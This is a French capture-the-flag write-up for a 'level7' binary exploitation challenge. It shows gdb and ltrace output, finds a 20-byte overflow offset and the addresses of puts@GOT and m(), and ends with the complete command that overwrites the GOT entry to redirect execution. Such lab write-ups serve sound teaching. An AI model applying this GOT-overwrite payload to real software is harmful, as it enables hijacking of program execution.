Il y a dans la fonction m() il y a le print de la variable c qui contient le .pass de level8 grace au fgets dans main()
il va falloir trouver un moyen d'executer m()
On va encore s'appuyer sur GOT pour rediriger le puts() dans GOT vers m()

pour se faire nous allons ecraser l'adresse de la varible dans laquel va se faire notre strcpy() avec l'argument argv[1]

Pour ca il nous faut trouver l'offset avec ltrace cette fois

ltrace ./level7 $(python -c 'print "e" * 23')

on peut voir que l'offset est de 20
Il faut trouver l'adresse de puts() dans GOT

(gdb) info function puts
All functions matching regular expression "puts":
Non-debugging symbols:
0x08048400  puts
0x08048400  puts@plt

(gdb) disas 0x08048400
Dump of assembler code for function puts@plt:
   0x08048400 <+0>:	jmp    *0x8049928
   0x08048406 <+6>:	push   $0x28
   0x0804840b <+11>:	jmp    0x80483a0

Super l'adresse de puts() dans GOT est 0x8049928

il ne manque plus que l'adresse de m()

(gdb) disas m
0x080484f4 <+0>:	push   %ebp
   0x080484f5 <+1>:	mov    %esp,%ebp
   0x080484f7 <+3>:	sub    $0x18,%esp
   0x080484fa <+6>:	movl   $0x0,(%esp)
   0x08048501 <+13>:	call   0x80483d0 <time@plt>

l'adresse de m() est 0x080484f4

Nous avons tout ce qui est necessaire pour la construction du payload

[offest de 20]+[adresse de puts() dans GOT] et en deuxieme argument l'addresse de m() pour la mettre dans la redirection du puts()
pour que m() soit appeler a la place du vrai puts()

./level7 $(python -c 'print "A" * 20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
